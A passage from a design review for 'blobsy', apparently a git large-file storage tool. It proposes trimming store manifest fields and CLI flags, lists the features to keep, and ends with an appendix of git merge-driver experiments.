| 8 | **One version field in `_blobsy/store.yaml`** | `format: 1` and `layout: 1` both mean “the store layout”; keep `layout`. | §5.3 |
| 9 | **Drop `#archive <size>`** from store manifests | Derivable from `list`/`exists`; one fewer field for two implementations to agree on. Keep `#tree #files #bytes #created #by`. | §5.4 |
| 10 | **Merge `status --verify` into `--remote`’s vocabulary or `doctor`** (optional) | `--verify` re-hashes local files; `doctor` already “re-hashes” for pins. Low value; judgment call. | §7.1 |

Things that look like candidates but should **stay**: `d` and `l` kinds (one validator,
one placement path, per simplicity 14); `cacheOnAdd` (the only escape for huge files on
non-reflink disks, F25); `clean` (UC-2 on laptops, usability 41); `diff` (the only
reviewer-facing output, usability 25); both snapshot modes (UC-3 vs UC-5/6 need opposite
packing); `push --repair` (the only way out of a poisoned key, F14); the known log (the
only offline evidence that is per store, F1).

Still more complicated than it needs to be, without a clean cut:
- **Three places describe what `snap restore` does** (§7.1 row, §8.4 steps + guard, §8.6
  incremental). Fold §8.6’s restore steps into §8.4 as “files mode” so one procedure has
  two branches, matching the code-reuse claim in §18.
- **The recoverability rule has four evidence sources after M1** (store object, known
  log, cached archive, live manifest).
  Present it as one sentence — *“the bytes can be re-fetched from the current store, or
  this machine saw the store hold them”* — with the four as bullets, so readers keep one
  idea.
- **§5.6’s table and §12’s machine keys** both describe the cache (`cacheDir`,
  `cacheMaxSize`, `cacheOnAdd`, `materialize`). One table, referenced from the other.

* * *

## Appendix: experiments

- `scratchpad/exp-undef-driver/r/`: `*.bref merge=blobsy` with no `merge.blobsy.driver`
  configured → git falls back to its text merge (adjacent adds conflict, nothing lost).
  Confirms §9 “without the driver … git uses its text merge” and lets Phase 1 ship
  `.gitattributes`.
- `scratchpad/exp-inner/perpath.mjs`: toy per-path driver with `outer`, `inner-omit`
  (design rule) and `inner-base` (proposed) modes.
  - `r-inner-omit/`, `r-inner-base/`: criss-cross with modify/delete on `c` (two merge
    bases verified). Omit → clean merge, `c` resurrected.
    Base → modify/delete conflict surfaced, `d` and `e` kept.
  - `f16-inner-omit/`, `f16-inner-base/`: the data-safety F16 scenario (both modify
    `c`). Both variants give the same correct result.
